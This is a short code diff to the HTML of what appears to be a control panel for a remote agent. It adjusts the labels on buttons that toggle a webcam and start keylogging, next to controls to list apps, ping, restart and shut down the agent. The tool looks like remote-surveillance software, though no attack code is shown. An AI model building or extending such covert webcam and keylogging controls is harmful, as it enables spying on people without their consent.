@@ -56,9 +56,9 @@
 
           <button onclick="getAppsCmd()">List Apps</button>
           <button onclick="getPingCmd()">Test Ping</button>
-          <button onclick="toggleWebcam()">Webcam <span id="webcam-cmd">On</span></button>
-          <button onclick="getKeyLog()">Key Logs</button>
-          
+          <button onclick="toggleWebcam()">Webcam: <span id="webcam-cmd" data-state="off"> On </span></button>
+          <button onclick="getKeyLog()">Key Logs: <span id="keylog-cmd" data-state="off"> Start </span></button>
+
           <button class="btn-restart" onclick="restartCmd()">Restart Agent</button>
           <button class="btn-shutdown" onclick="shutdownCmd()">Shutdown Agent</button>
         </div>
